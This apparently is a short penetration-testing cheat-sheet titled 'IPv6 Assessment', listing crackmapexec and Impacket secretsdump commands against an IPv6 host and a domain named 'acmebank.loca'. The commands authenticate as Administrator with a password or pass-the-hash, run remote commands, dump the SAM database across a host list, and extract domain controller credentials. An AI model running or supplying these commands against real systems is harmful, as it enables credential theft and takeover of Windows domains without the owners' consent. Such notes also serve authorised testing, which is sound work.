### IPv6 Assessment
| for Example  |
| ------------- |
|crackmapexec 2001:db7::1234:1 -u Administrator -p 'Passw0rd' -x "ipconfig" |
|crackmapexec 2001:db7::1234:1 -u Administrator -H "Hash" --sam |
|crackmapexec cme-hosts.txt -u Administrator -H "Hash" --sam |
|crackmapexec 2001:db7::1234:1 -u Administrator -H "Hash" -x "hostname"|
|python secretsdump.py -hashes "Hash" -just-dc acmebank.loca/Administrator@2001:db7::1234:1 |
|crackmapexec 2001:db7::1234:1 -u Administrator -p 'Passw0rd' -x "ipconfig" |
